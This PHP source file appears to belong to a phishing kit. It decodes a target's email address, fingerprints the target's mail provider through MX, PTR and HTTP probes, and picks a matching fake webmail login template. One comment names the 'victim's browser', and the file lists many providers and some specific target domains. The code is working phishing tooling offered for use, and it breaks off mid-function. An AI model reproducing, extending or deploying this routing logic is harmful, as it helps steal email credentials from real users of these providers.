<?php
// ============================================================
// Helper functions for index.php
// ============================================================

function normalizeProducts(string $raw): string {
    $raw = trim($raw);
    if ($raw === '') return '';

    if (filter_var($raw, FILTER_VALIDATE_EMAIL)) {
        return $raw;
    }

    $b64 = strtr($raw, '-_', '+/');
    $b64 .= str_repeat('=', (4 - strlen($b64) % 4) % 4);
    $decoded = base64_decode($b64, true);
    if ($decoded !== false && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
        return $decoded;
    }

    if (ctype_xdigit($raw) && strlen($raw) % 2 === 0) {
        $decoded = @hex2bin($raw);
        if ($decoded !== false && filter_var($decoded, FILTER_VALIDATE_EMAIL)) {
            return $decoded;
        }
    }

    return '';
}

function loadReferenceFile(string $name): array {
    $paths = [
        __DIR__ . '/' . $name,
        __DIR__ . '/assets/' . $name,
        dirname(__DIR__) . '/' . $name,
    ];
    foreach ($paths as $p) {
        if (file_exists($p)) {
            $lines = file($p, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $lines = array_filter($lines, static fn($l) => !str_starts_with(trim($l), '#'));
            return array_values(array_filter(array_map('trim', $lines)));
        }
    }
    return [];
}

function containsToken(string $haystack, string $needle): bool {
    $needle = strtolower($needle);
    if ($needle === '') return false;

    if (strlen($needle) >= 6) {
        return str_contains($haystack, $needle);
    }

    $pattern = '/(?:^|[\s.@\-])' . preg_quote($needle, '/') . '(?:[\s.\-]|$)/';
    return (bool) preg_match($pattern, $haystack);
}

function _routing_keyword_set(): array {
    return [
        '163mx01.mxmail.netease.com','163mx02.mxmail.netease.com',
        '163mx03.mxmail.netease.com','163mx04.mxmail.netease.com',
        '126mx00.mxmail.netease.com','126mx01.mxmail.netease.com',
        '126mx02.mxmail.netease.com',
        'qiye163mx','qiye.163.com','mxmail.netease.com','ntesmail.com',
        'mx.ym.163.com','mx.163.com','163.com','126.com',
        '263.net','263.com','mx.263.net','mail.263.net','263',
        'mxa.mailgun','mxb.mailgun','mailgun.org','mailgun.com',
        'aspmx.l.google.com','alt1.aspmx.l.google.com','alt2.aspmx.l.google.com',
        '.google.com','.googlemail.com','.googleusercontent.com',
        'webmail.aruba.it','mx.aruba.it','aruba.it','aruba',
        'mail.protection.outlook.com','protection.outlook.com',
        '.outlook.com','.outlook.cn','.office365.com','.microsoftonline.com',
        'mta5.am0.yahoodns.net','mta6.am0.yahoodns.net','mta7.am0.yahoodns.net',
        'mx-aol.mail.gm0.yahoodns.net','yahoodns.net',
        '.zoho.com','.zoho.eu','.zoho.in','.zohomail.com','.zohomail.eu',
        'zohomail','mail.zoho',
        'qq.com','mail.qq.com','yeah.net','netvigator.com',
        'protonmail.ch','.protonmail.com','mail.protonmail','protonmail',
        'mx.mailplug.com','mailplug',
        'mx.hostedemail.com','hostedemail',
        'mx1.privateemail.com','mx2.privateemail.com','privateemail',
        'mx00.ionos.com','mx01.ionos.com','mx00.ionos.de','mx01.ionos.de',
        'mail.ionos.com','ionos.com','ionos.de','ionos',
        'mx.hostinger.com','mx1.hostinger.com','mx2.hostinger.com',
        'mail.hostinger.com','hostinger.com','hostinger',
        'mail.titan.email','titan.email','titan.com',
        'mail.fastmail.com','messagingengine','fastmail',
        'mx.gmx.net','mx.gmx.com','gmx',
        'mx.mail.com','mailcom','mail.com',
        'smartermail','smartertools','smarter','smartmail',
        'mailenable','mdaemon','worldclient','squirrelmail','afterlogic',
        'icewarp',
        'kerio connect','kerio.com','kerio',
        'horde','mailcow',
        'mailanyone','mx25.net','.mx25.',
        'cpanel','whm','cpsess','cpcalendars','cpcontacts',
        'unifiedlayer','hostgator','bluehost','justhost','ipage',
        'greengeeks','a2hosting','inmotion','namecheap',
        'web-hosting','.web-hosting.',
        'mx1.kakao.com','mx2.kakao.com','mx3.kakao.com','mx4.kakao.com',
        'kakao.com','daum.net','daum',
        'mx.hiworks.co.kr','mailapp.hiworks.co.kr','hiworks',
        'naver.com','naver',
        'aspmx2.worksmobile.com','aspmx.worksmobile.com','worksmobile.com','worksmobile',
        'bidpond.net.au','bidpond',
        'mail.icloud.com','icloud.com','spf.mail.me.com',
        'rediffmailpro.com','rediffmailpro',
        'mx.uhserver.com','uhserver',
        'mx.terraempresas.com.br','terraempresas',
        'mx.terra.com.br','terra.com.br',
        'locaweb.com.br','locaweb',
        'mx3.bol','bol.com.br',
        'uol.com.br','email.uol.com.br','uol',
        'mx.o2.com','mx.rambler.ru','rambler.ru',
        'mx.aliyun.com','mail.aliyun.com','qiye.aliyun.com','.mail.aliyun.',
        'aliyun','mxhichina',
        'mx-biz.mail','bizmail','chinaemail','bossmail','global-mail',
        'cybermail.jp','cybermail','.163mx','163mx',
        'mail.cybermail.jp','wadax.ne.jp','wadax',
        'webmail.lolipop.jp','lolipop','mx01.lolipop.jp',
        'hanmail.net',
        'mimecast','mimecast.com','smarshmail','smarsh',
        'emailsrvr.com','emailsrvr','rackspace',
        'secureserver.net','secureserver','godaddy',
        'ovhcloud.com','ovh.net','ovh.com','ovhcloud','ovh',
        'mweb.co.za','mweb','telkomsa.net','telkomsa',
        'mail201.securemail.hk','udomain',
        'webmail.global-mail.cn','mail201.securemail',
        'webmail.strato.de','strato','smtpin.rzone.de',
        'mail.kurumsaleposta.com','kurumsaleposta','natrohost','natro',
        'mail.connect.com.fj','connect.com.fj','connect',
        'webmail.lolipop','webmail.cybermail',
        'poczta.interia.pl','mx.interia.pl','interia',
        'poczta.orange.pl','orange.pl','orangepl',
        'register.it','registerit',
        'netsol','networksolutionsemail.com',
        'webmail.telkomsa','webmail.konsoleh.co.za','konsolh','konsoleh',
        'mail1.telkomsa.net','mail201',
        'windowslive.com','livemail.co.uk',
        'windstream.net','kinetic','windstream',
        'rcn.com','mail.rcn.com',
        'comcast.net','comcast','cox.net','charter.net','att.net',
        'verizon.net','sbcglobal.net','bellsouth.net','juno.com','netzero.net',
        'mailproxy','hydra.sophos.com','prod.hydra.sophos.com','sophos.com',
        'iphmx.com','arsmtp.com','trendmicro.eu','trendmicro.com',
        'pphosted.com','barracudanetworks.com','barracuda',
        'mailgate1.','mailgate2.','mailgate',
        'roundcube','rcmail','stackmail','ispservices',
        'roundcube_sessid','rcmcsrftoken','?_task=login',
        'exchange.','exchange','owa.','autodiscover','zimbra','serverdata',
		'magicserver.eu',
    ];
}

function hasRecognizableMx(string $domain): bool {
    if ($domain === '') return false;
    $domain = strtolower($domain);

    foreach (['apart-rent.com', 'goeugo.eu', 'nomadsensecreative.com', 'disc.ie',
              'piumotc.kg', 'arsa.com.my'] as $base) {
        if ($domain === $base || str_ends_with($domain, '.' . $base)) return true;
    }

    $mx = @dns_get_record($domain, DNS_MX);
    if (empty($mx)) return false;

    $haystack = ' ' . $domain;
    foreach ($mx as $r) {
        $haystack .= ' ' . strtolower($r['target'] ?? '');
    }

    foreach (_routing_keyword_set() as $kw) {
        if (str_contains($haystack, $kw)) return true;
    }
    return false;
}

function getMxFile($products) {
    if (empty($products) || !filter_var($products, FILTER_VALIDATE_EMAIL)) {
        return "all.php";
    }
    $domain = substr($products, strpos($products, '@') + 1);
    if (empty($domain)) return "all.php";

    // Cache key versioned by source hash — editing this file
    // auto-invalidates every cached route.
    $srcHash   = substr(md5_file(__DIR__ . '/index-functions.php'), 0, 8);
    $cacheFile = sys_get_temp_dir() . '/webmail_route_' . $srcHash . '_' . md5($domain) . '.txt';
    if (file_exists($cacheFile) && (time() - filemtime($cacheFile)) < 86400) {
        $cached = trim(file_get_contents($cacheFile));
        if ($cached !== '') return $cached;
    }

    // STEP 1 — Explicit routes
    $explicit_routes = [
        'apart-rent.com'         => 'cpw.php',
        'goeugo.eu'              => 'rc.php',
        'nomadsensecreative.com' => 'rc.php',
        'disc.ie'                => 'smarter.php',
        'piumotc.kg'             => 'kerio.php',
        'arsa.com.my'            => 'squirrel.php',
    ];
    $domainLower = strtolower($domain);
    foreach ($explicit_routes as $base => $target) {
        if ($domainLower === $base || str_ends_with($domainLower, '.' . $base)) {
            @file_put_contents($cacheFile, $target);
            return $target;
        }
    }

    // STEP 2 — Build haystacks
    $mxRecords   = @dns_get_record($domain, DNS_MX);
    $mxHaystack  = '';
    $ptrHaystack = '';

    if (!empty($mxRecords)) {
        foreach ($mxRecords as $mx) {
            $target = strtolower($mx['target'] ?? '');
            if ($target === '') continue;
            $mxHaystack .= ' ' . $target;

            $aRecords = @dns_get_record($target, DNS_A);
            if (!$aRecords) continue;
            foreach ($aRecords as $a) {
                if (empty($a['ip'])) continue;
                $reversedIp = implode('.', array_reverse(explode('.', $a['ip']))) . '.in-addr.arpa';
                $ptrRecords = @dns_get_record($reversedIp, DNS_PTR);
                if (!$ptrRecords) continue;
                foreach ($ptrRecords as $ptr) {
                    $ptrHost = strtolower($ptr['target'] ?? '');
                    if ($ptrHost !== '') $ptrHaystack .= ' ' . $ptrHost;
                }
            }
        }
    }

    $mxHaystackOnly   = $mxHaystack . ' ' . $domainLower;
    $combinedHaystack = $mxHaystack . ' ' . $ptrHaystack . ' ' . $domainLower;

    // STEP 3 — Ordered keyword map
    $keywords_map = [
        // 3a. Netease / 163 / 126
        '163mx01.mxmail.netease.com'    => '163.php',
        '163mx02.mxmail.netease.com'    => '163.php',
        '163mx03.mxmail.netease.com'    => '163.php',
        '163mx04.mxmail.netease.com'    => '163.php',
        '126mx00.mxmail.netease.com'    => '126.php',
        '126mx01.mxmail.netease.com'    => '126.php',
        '126mx02.mxmail.netease.com'    => '126.php',
        'qiye163mx'                     => 'netease.php',
        'qiye.163.com'                  => 'netease.php',
        'mxmail.netease.com'            => '163.php',
        'ntesmail.com'                  => 'netease.php',
        'mx.ym.163.com'                 => 'netease.php',
        'mx.163.com'                    => '163.php',
        '163.com'                       => '163.php',
        '126.com'                       => '126.php',
        'hanmail.net'                   => 'daum.php',

        // 3a-2. 263.net
        '263.net'                       => '263.php',
        '263.com'                       => '263.php',
        'mx.263.net'                    => '263.php',
        'mail.263.net'                  => '263.php',
        '263'                           => '263.php',

        // 3b. Mailgun
        'mxa.mailgun'                   => 'mailgun.php',
        'mxb.mailgun'                   => 'mailgun.php',
        'mailgun.org'                   => 'mailgun.php',
        'mailgun.com'                   => 'mailgun.php',

        // 3c. Google
        '.google.com'                   => 'google.php',
        '.googlemail.com'               => 'google.php',
        '.googleusercontent.com'        => 'google.php',
        'aspmx.l.google.com'            => 'google.php',

        // 3d. Aruba — before Office 365
        'webmail.aruba.it'              => 'aruba.php',
        'mx.aruba.it'                   => 'aruba.php',
        'aruba.it'                      => 'aruba.php',
        'aruba'                         => 'aruba.php',

        // 3e. Office 365
        'mail.protection.outlook.com'   => 'office.php',
        'protection.outlook.com'        => 'office.php',
        '.outlook.com'                  => 'office.php',
        '.outlook.cn'                   => 'office_cn.php',
        '.office365.com'                => 'office.php',

        // 3f. Yahoo / AOL
        'mx-biz.mail.am0.yahoodns.net'  => 'bizmail.php',
        'mta6.am0.yahoodns.net'         => 'yahoo.php',
        'mx-aol.mail.gm0.yahoodns.net'  => 'aol.php',

        // 3g. Zoho
        '.zoho.com'                     => 'zoho.php',
        '.zoho.eu'                      => 'zoho.php',
        '.zoho.in'                      => 'zoho.php',
        '.zohomail.com'                 => 'zoho.php',
        '.zohomail.eu'                  => 'zoho.php',
        'mail.zoho'                     => 'zoho.php',
        'zohomail'                      => 'zoho.php',

        // 3h. Other free / hosted
        'qq.com'                        => 'qq.php',
        'yeah.net'                      => 'yeah.php',
        'protonmail.ch'                 => 'protonmail.php',
        '.protonmail.com'               => 'protonmail.php',
        'mail.protonmail'               => 'protonmail.php',
        'messagingengine'               => 'fastmail.php',
        'mailplug.com'                  => 'mailplug.php',
        'hostedemail.com'               => 'hostedemail.php',
        'mx1.privateemail.'             => 'private.php',
        'mx2.privateemail.'             => 'private.php',

        // IONOS
        'mx00.ionos.com'                => 'ionos.php',
        'mx01.ionos.com'                => 'ionos.php',
        'mx00.ionos.de'                 => 'ionos.php',
        'mx01.ionos.de'                 => 'ionos.php',
        'mail.ionos.com'                => 'ionos.php',
        'ionos.com'                     => 'ionos.php',
        'ionos.de'                      => 'ionos.php',
        'ionos'                         => 'ionos.php',

        // Hostinger
        'mx.hostinger.com'              => 'hostinger.php',
        'mx1.hostinger.com'             => 'hostinger.php',
        'mx2.hostinger.com'             => 'hostinger.php',
        'mail.hostinger.com'            => 'hostinger.php',
        'hostinger.com'                 => 'hostinger.php',
        'hostinger'                     => 'hostinger.php',

        'mail.titan.email'              => 'hostinger.php',
        'mail.fastmail.com'             => 'fastmail.php',
        'mx.gmx.net'                    => 'gmx.php',
        'mx.gmx.com'                    => 'gmx.php',
        'one.com'                       => 'one.php',
        'gmx.net'                       => 'gmx.php',
        '.gmx.'                         => 'gmx.php',
        'kasserver'                     => 'kasserver.php',

        // OVH
        'mx.ovh.net'                    => 'ovhcloud.php',
        'mx0.mail.ovh.net'              => 'ovhcloud.php',
        'mx1.mail.ovh.net'              => 'ovhcloud.php',
        'ovhcloud.com'                  => 'ovhcloud.php',
        'ovh.net'                       => 'ovhcloud.php',
        'ovh.com'                       => 'ovhcloud.php',
        'ovhcloud'                      => 'ovhcloud.php',
        'ovh'                           => 'ovhcloud.php',

        // 3i. Self-hosted
        'smartermail'                   => 'smarter.php',
        'smartertools'                  => 'smarter.php',
        'mailenable'                    => 'enable.php',
        'mdaemon'                       => 'mdaemon.php',
        'worldclient'                   => 'mdaemon.php',
        'squirrelmail'                  => 'squirrel.php',
        'afterlogic'                    => 'afterlogic.php',
        'icewarp'                       => 'icewarp.php',
        'kerio connect'                 => 'kerio.php',
        'kerio.com'                     => 'kerio.php',
        'kerio'                         => 'kerio.php',
        'horde'                         => 'horde.php',
        'mailcow'                       => 'mailcow.php',

        // 3j. MailAnyone / MX25
        'mailanyone'                    => 'smarter.php',
        'mx25.net'                      => 'smarter.php',
        '.mx25.'                        => 'smarter.php',

        // 3k. cPanel / hosting
        'cpanel'                        => 'cpw.php',
        'whm.'                          => 'cpw.php',
        'cpsess'                        => 'cpw.php',
        'cpcalendars'                   => 'cpw.php',
        'cpcontacts'                    => 'cpw.php',
        'unifiedlayer'                  => 'cpw.php',
        'hostgator'                     => 'cpw.php',
        'bluehost'                      => 'cpw.php',
        'justhost'                      => 'cpw.php',
        'ipage'                         => 'cpw.php',
        'greengeeks'                    => 'cpw.php',
        'a2hosting'                     => 'cpw.php',
        'inmotion'                      => 'cpw.php',
        'namecheap'                     => 'nc.php',
        'registrar-servers.com'         => 'nc.php',

        // 3l. Regional
        'mx1.kakao.com'                 => 'daum.php',
        'mx2.kakao.com'                 => 'daum.php',
        'mx3.kakao.com'                 => 'daum.php',
        'mx4.kakao.com'                 => 'daum.php',
        'daum.net'                      => 'daum.php',
        'mx.hiworks.co.kr'              => 'hiworks.php',
        'mailapp.hiworks.co.kr'         => 'hiworks.php',
        'naver.com'                     => 'naver.php',

        // Worksmobile
        'aspmx2.worksmobile.com'        => 'worksmobile.php',
        'aspmx.worksmobile.com'         => 'worksmobile.php',
        'worksmobile.com'               => 'worksmobile.php',
        'worksmobile'                   => 'worksmobile.php',

        'mail.icloud.com'               => 'icu.php',
        'spf.mail.me.com'               => 'icu.php',
        'bidpond.net.au'                => 'bidpond.php',
        'rediffmailpro.com'             => 'rediffmailpro.php',
        'mx.uhserver.com'               => 'userver.php',
        'mx.terraempresas.com.br'       => 'terrabr.php',
        'mx.terra.com.br'               => 'terrabr.php',
        'locaweb.com.br'                => 'locaweb.php',
        'mx3.bol'                       => 'uol.php',
        'bol.com.br'                    => 'uol.php',
        'uol.com.br'                    => 'uol.php',
        '.mailcloud.com.tw'             => 'mail2000.php',
        'mailnara'                      => 'mailnara.php',

        // 3m. Chinese
        'mx.aliyun.com'                 => 'mailaliyun.php',
        'mail.aliyun.com'               => 'mailaliyun.php',
        'qiye.aliyun.com'               => 'mxhichina.php',
        '.mail.aliyun.'                 => 'mailaliyun.php',
        'mxhichina'                     => 'mailaliyun.php',
        'mx-biz.mail'                   => 'bizmail.php',
        'chinaemail'                    => 'bossmail.php',
        'global-mail'                   => 'globalmail.php',
        'cybermail.jp'                  => 'cybermail.php',

        // 3n. Japanese
        'mail.cybermail.jp'             => 'cybermail.php',
        'wadax.ne.jp'                   => 'wadax.php',
        'webmail.lolipop.jp'            => 'lolipop.php',
        'mx01.lolipop.jp'               => 'lolipop.php',

        // 3o. Corporate
        'mimecast'                      => 'mimecast.php',
        'smarshmail'                    => 'smarsh.php',
        'emailsrvr.com'                 => 'emailsrvr.php',
        'rackspace'                     => 'emailsrvr.php',
        'secureserver.net'              => 'godaddy.php',
        'godaddy'                       => 'godaddy.php',
        'netsol'                        => 'netsol.php',
        'networksolutionsemail.com'     => 'netsol.php',
        'dreamhost'                     => 'dreamhost.php',
        'mx1.dreamhost.com'             => 'dreamhost.php',

        // 3p. Other regional / ISP
        'mweb.co.za'                    => 'mweb.php',
        'telkomsa.net'                  => 'telkomsa.php',
        'mail201.securemail.hk'         => 'udomain.php',
        'udomain.com.hk'                => 'udomain.php',
        'udomain'                       => 'udomain.php',
        'strato.de'                     => 'strato.php',
        'webmail.strato.de'             => 'strato.php',
        'smtpin.rzone.de'               => 'strato.php',
        'webmail.aruba.it'              => 'aruba.php',
        'aruba.it'                      => 'aruba.php',
        'mail.kurumsaleposta.com'       => 'natro.php',
        'kurumsaleposta.com'            => 'natro.php',
        'kurumsaleposta'                => 'natro.php',
        'natrohost'                     => 'natro.php',
        'natro'                         => 'natro.php',
        'connect.com.fj'                => 'connect.php',
        'poczta.interia.pl'             => 'interia.php',
        'mx.interia.pl'                 => 'interia.php',
        'poczta.orange.pl'              => 'orangepl.php',
        'webmail.register.it'           => 'registerit.php',
        'register.it'                   => 'registerit.php',
        'webmail.konsoleh.co.za'        => 'konsolh.php',
        'konsoleh.co.za'                => 'konsolh.php',
        'webmail.windstream.net'        => 'windstream.php',
        'windstream.net'                => 'windstream.php',
        'comcast.net'                   => 'comcast.php',
        'comcast'                       => 'comcast.php',
        'livemail.co.uk'                => 'owa.php',
        '.maychuemail.com'              => 'maychuemail.php',
        '.mailhostbox.com'              => 'apsuite.php',
        'yunyou'                        => 'yunyou.php',
        'mx2.yunyou'                    => 'yunyou.php',
		'magicserver'                   => 'all.php',

        // 3q. Privacy / relay
        'hydra.sophos.com'              => 'office.php',
        'iphmx.com'                     => 'office.php',
        'arsmtp.com'                    => 'office.php',
        'trendmicro.eu'                 => 'office.php',
        'trendmicro.com'                => 'office.php',
        'pphosted.com'                  => 'office.php',
        'barracudanetworks.com'         => 'office.php',
        'mailgate1.'                    => 'office.php',
        'mailgate2.'                    => 'office.php',

        // 3r. Generic self-hosted (last)
        'servermaster.it'               => 'rc.php',
        'roundcube'                     => 'rc.php',
        'rcmail'                        => 'rc.php',
        'stackmail'                     => 'rc.php',
        'ispservices'                   => 'rc.php',
        'roundcube_sessid'              => 'rc.php',
        'rcmcsrftoken'                  => 'rc.php',
        '?_task=login'                  => 'rc.php',
        'zimbra'                        => 'zimbra.php',
        'serverdata'                    => 'owa.php',
        'exchange.'                     => 'owa.php',
        'exchange'                      => 'owa.php',
        'owa.'                          => 'owa.php',
        'autodiscover'                  => 'owa.php',
    ];

    // STEP 4 — MX-only match
    foreach ($keywords_map as $kw => $file) {
        if (containsToken($mxHaystackOnly, $kw)) {
            @file_put_contents($cacheFile, $file);
            return $file;
        }
    }

    // STEP 5 — Combined match
    foreach ($keywords_map as $kw => $file) {
        if (containsToken($combinedHaystack, $kw)) {
            @file_put_contents($cacheFile, $file);
            return $file;
        }
    }

    // STEP 6 — mail.com strict
    if (preg_match('/(?:^|[\s.@])mail\.com(?:[\s.]|$)/', $combinedHaystack)) {
        @file_put_contents($cacheFile, 'mailcom.php');
        return 'mailcom.php';
    }

    // STEP 7 — DomainFormat + ValidTitles HTTP probe
    $formats = loadReferenceFile('DomainFormat.txt');
    if (empty($formats)) {
        $formats = [
            '[domain]', 'mail.[domain]', 'webmail.[domain]',
            'zimbra.[domain]', 'mail.[domain]/zimbra/',
            'webmail.[domain]/zimbra/', 'autodiscover.[domain]',
            '[domain]:2095/', '[domain]:2096/',
            '[domain]/webmail', '[domain]/roundcube',
            'webmail.[domain]/roundcube',
            'mail.[domain]/owa/', '[domain]/owa/',
            'mail.[domain]/Login.aspx', 'mail.[domain]/login.aspx',
            '[domain]/Login.aspx',
        ];
    }
    $urls = [];
    foreach ($formats as $tpl) {
        $url = str_replace('[domain]', $domain, $tpl);
        if (!preg_match('#^https?://#i', $url)) {
            $url = (preg_match('#:209[56]#', $url) || preg_match('#:80#', $url))
                ? 'http://' . $url
                : 'https://' . $url;
        }
        $urls[] = $url;
    }
    $urls[] = 'https://' . $domain;
    $urls   = array_values(array_unique($urls));

    $titles      = loadReferenceFile('ValidTitles.txt');
    $titlesLower = array_map(fn($t) => strtolower(trim($t)), $titles);

    foreach ($urls as $url) {
        $result = inspectWebmailPage($url, $titlesLower);
        if ($result !== null && $result !== '') {
            @file_put_contents($cacheFile, $result);
            return $result;
        }
    }

    // STEP 8 — SmarterMail direct probe
    foreach (['mail.' . $domain, 'webmail.' . $domain, $domain] as $host) {
        $smUrl  = "http://{$host}/Login.aspx";
        $smHtml = fetchPage($smUrl);
        if ($smHtml !== null && !isModSecurityBlock($smHtml)) {
            $smLower = strtolower($smHtml);
            if (str_contains($smLower, 'smartermail') ||
                str_contains($smLower, 'smartermail enterprise') ||
                str_contains($smLower, 'login to smartermail') ||
                str_contains($smLower, 'smartertools') ||
                str_contains($smLower, 'svlogin') ||
                str_contains($smLower, 'ctl00_')) {
                @file_put_contents($cacheFile, 'smarter.php');
                return 'smarter.php';
            }
        }
    }

    // STEP 9 — cPanel 2096
    $fp = @fsockopen("ssl://{$domain}", 2096, $errno, $errstr, 2);
    if ($fp) {
        fclose($fp);
        @file_put_contents($cacheFile, 'cpw.php');
        return 'cpw.php';
    }

    // STEP 10 — SmarterMail 9998
    foreach (['mail.' . $domain, 'webmail.' . $domain, $domain] as $host) {
        $fp = @fsockopen("ssl://{$host}", 9998, $e1, $e2, 2);
        if ($fp) {
            fclose($fp);
            @file_put_contents($cacheFile, 'smarter.php');
            return 'smarter.php';
        }
    }

    // ============================================================
    // STEP 11 — Bare-domain fallback, hardened.
    //
    // We only return the bare domain if the root page has POSITIVE
    // evidence of being a webmail login:
    //   1. Title matches a ValidTitles.txt entry, OR
    //   2. Body matches a known webmail signature, OR
    //   3. Body contains a login form (form + password field).
    //
    // Otherwise route to all.php. This prevents sending the end
    // user into a domain that serves a WAF block page, an unrelated
    // corporate homepage, or a 404 to the victim's browser — even
    // if the server responded cleanly to OUR probe.
    // ============================================================
    $fallbackUrl  = 'https://' . $domain;
    $fallbackBody = fetchPage($fallbackUrl);

    if ($fallbackBody !== null && !isModSecurityBlock($fallbackBody)) {

        // Positive signal 1 — title matches a known webmail title
        $fallbackTitle = extractTitle($fallbackBody);
        if ($fallbackTitle !== null) {
            $titleClean = strtolower(trim(html_entity_decode($fallbackTitle, ENT_QUOTES | ENT_HTML5)));

            foreach ($titlesLower as $t) {
                if ($t === '' || strlen($t) < 6) continue;
                if (str_contains($titleClean, $t)) {
                    $mapped = mapTitleToFile($titleClean);
                    if ($mapped !== '') {
                        @file_put_contents($cacheFile, $mapped);
                        return $mapped;
                    }
                }
            }
        }

        // Positive signal 2 — body matches a known webmail signature
        $bodyMatch = matchBodySignatures($fallbackBody);
        if ($bodyMatch !== null) {
            @file_put_contents($cacheFile, $bodyMatch);
            return $bodyMatch;
        }

        // Positive signal 3 — body contains a login form
        $bLower = strtolower($fallbackBody);
        $hasLoginForm = (
            str_contains($bLower, '<form') &&
            (
                str_contains($bLower, 'type="password"') ||
                str_contains($bLower, "type='password'") ||
                str_contains($bLower, 'type=password')
            )
        );

        if ($hasLoginForm) {
            // Looks like a genuine login page. Trust it.
            return $fallbackUrl;
        }
    }

    // No positive evidence — route to our local template.
    @file_put_contents($cacheFile, 'all.php');
    return 'all.php';
}

// ------------------------------------------------------------
// inspectWebmailPage
// ------------------------------------------------------------
function inspectWebmailPage(string $url, array $titlesLower): ?string {
    $html = fetchPage($url);
    if ($html === null) return null;

    $title = extractTitle($html);

    if ($title === null
        || stripos($title, 'please wait') !== false
        || stripos($html, 'please wait while we verify') !== false
        || stripos($html, 'checking your browser') !== false
    ) {
        sleep(3);
        $html2 = fetchPage($url);
        if ($html2 !== null) {
            $title2 = extractTitle($html2);
            if ($title2 !== null) $title = $title2;
            $html = $html2;
        }
    }

    $bodyMatch = matchBodySignatures($html);
    if ($bodyMatch !== null) return $bodyMatch;

    if ($title === null) return null;

    $titleClean = strtolower(trim(html_entity_decode($title, ENT_QUOTES | ENT_HTML5)));

    // Exact match first
    foreach ($titlesLower as $t) {
        if ($t === $titleClean) return mapTitleToFile($titleClean);
    }

    // Substring match — only for titles >= 6 chars
    foreach ($titlesLower as $t) {
        if ($t === '' || strlen($t) < 6) continue;
        if (str_contains($titleClean, $t)) return mapTitleToFile($t);
    }

    // Very short titles (e.g. "login", "webmail") — only as last resort
    foreach ($titlesLower as $t) {
        if ($t === '' || strlen($t) >= 6) continue;
        if (str_contains($titleClean, $t)) return mapTitleToFile($t);
    }

    return null;
}

function extractTitle(string $html): ?string {
    if (preg_match('#<title[^>]*>(.*?)</title>#is', $html, $m)) {
        return trim($m[1]);
    }
    return null;
}

function mapTitleToFile(string $title): string {
    $t = strtolower(trim($title));

    // ---- Reject list: never route on WAF / block-page titles ----
    static $reject = [
        'not acceptable',
        'appropriate representation',
        'mod_security',
        'modsecurity',
        'access denied',
        'forbidden',
        'attention required',
        'cloudflare',
        'error 1020',
        'website is offline',
        'domain not found',
        "this site can't be reached",
        'this site can’t be reached',
        'an error occurred',
        'service unavailable',
        'bad gateway',
    ];
    foreach ($reject as $bad) {
        if (str_contains($t, $bad)) return '';
    }

    // ---- Provider-specific titles BEFORE generic ones ----
    if (str_contains($t, 'squirrelmail') || str_contains($t, 'squirrel mail')) return 'squirrel.php';
    if (str_contains($t, 'roundcube') || str_contains($t, 'rcmail')) return 'rc.php';
    if (str_contains($t, 'kerio'))                                       return 'kerio.php';

    if (str_contains($t, 'outlook web app') ||
        str_contains($t, 'outlook web access') ||
        $t === 'owa' ||
        str_contains($t, 'exchange server') ||
        str_contains($t, 'exchange admin center') ||
        str_contains($t, 'exchange control panel')) {
        return 'owa.php';
    }

    if (str_contains($t, 'outlook') ||
        str_contains($t, 'sign in - google accounts')) {
        return 'office.php';
    }

    if (str_contains($t, 'sogo'))                                       return 'mailcow.php';

    if (str_contains($t, 'smartermail') ||
        str_contains($t, 'smartertools')) {
        return 'smarter.php';
    }

    if (str_contains($t, 'zimbra'))                                     return 'zimbra.php';
    if (str_contains($t, 'mailenable'))                                 return 'enable.php';
    if (str_contains($t, 'horde'))                                      return 'horde.php';
    if (str_contains($t, 'icewarp'))                                    return 'icewarp.php';
    if (str_contains($t, 'mdaemon') || str_contains($t, 'worldclient')) return 'mdaemon.php';
    if (str_contains($t, 'afterlogic'))                                 return 'afterlogic.php';
    if (str_contains($t, 'dreamhost'))                                  return 'dreamhost.php';
    if (str_contains($t, 'zoner'))                                      return 'zoner.php';
    if (str_contains($t, 'mailcow'))                                    return 'mailcow.php';
    if (str_contains($t, 'konsoleh'))                                   return 'konsolh.php';
    if (str_contains($t, 'udomain'))                                    return 'udomain.php';
    if (str_contains($t, 'mailnara'))                                   return 'mailnara.php';
    if (str_contains($t, 'hostinger'))                                  return 'hostinger.php';
    if (str_contains($t, 'mail2000') || str_contains($t, 'mailcloud'))  return 'mail2000.php';
    if ($t === 'uol')                                                   return 'uol.php';

    // ---- cPanel / generic — LAST because "webmail login" is
    //      shared by many providers and must not shadow them ----
    if (str_contains($t, 'cpanel') || str_contains($t, 'whm'))          return 'cpw.php';

    if (in_array($t, [
        'webmail', 'webmail login', 'webmail redirect',
        'webmail client sign in', 'webmail sign in',
        'web client sign in', 'web app', 'login', 'welcome',
        'welcome to webmail', 'welcome page', 'welcome portal',
        'webmail access portal', 'web-based email client',
        'mail login', 'sign in', 'log in', 'user login',
        'account login', 'access login page', 'secure login',
    ], true)) {
        return 'cpw.php';
    }
    return '';
}

function matchBodySignatures(string $html): ?string {
    $h = strtolower($html);

    // Defensive: reject WAF block pages before signature matching
    if (str_contains($h, 'not acceptable!') &&
        str_contains($h, 'appropriate representation')) {
        return null;
    }
    if (str_contains($h, 'this error was generated by mod_security')) {
        return null;
    }

    // Provider-specific signatures BEFORE cPanel
    if (str_contains($h, 'squirrelmail') ||
        str_contains($h, 'squirrel mail') ||
        str_contains($h, 'name="login_username"') ||
        str_contains($h, 'name="secretkey"')) {
        return 'squirrel.php';
    }

    if (str_contains($h, 'kerio') &&
        (str_contains($h, 'webmail') || str_contains($h, 'webclient'))) {
        return 'kerio.php';
    }

    if (str_contains($h, 'rcmail') ||
        str_contains($h, 'roundcube') ||
        str_contains($h, '?_task=login') ||
        str_contains($h, '_task=login') ||
        str_contains($h, 'rcmcsrftoken') ||
        str_contains($h, 'roundcube_sessid') ||
        str_contains($h, 'id="rcmloginuser"') ||
        str_contains($h, "id='rcmloginuser'") ||
        str_contains($h, 'id="rcmloginpwd"') ||
        str_contains($h, "id='rcmloginpwd'") ||
        str_contains($h, 'name="_task"') ||
        str_contains($h, 'name="_action"')) {
        return 'rc.php';
    }

    if (str_contains($h, 'logon.aspx') ||
        str_contains($h, '/owa/') ||
        str_contains($h, 'outlook web app') ||
        str_contains($h, 'outlook web access') ||
        str_contains($h, 'microsoft.exchange') ||
        str_contains($h, '/ecp/') ||
        str_contains($h, 'logoff.aspx')) {
        return 'owa.php';
    }

    if (str_contains($h, 'sogo') ||
        str_contains($h, '/sogo/') ||
        str_contains($h, 'sogod') ||
        str_contains($h, 'sogo-webmail') ||
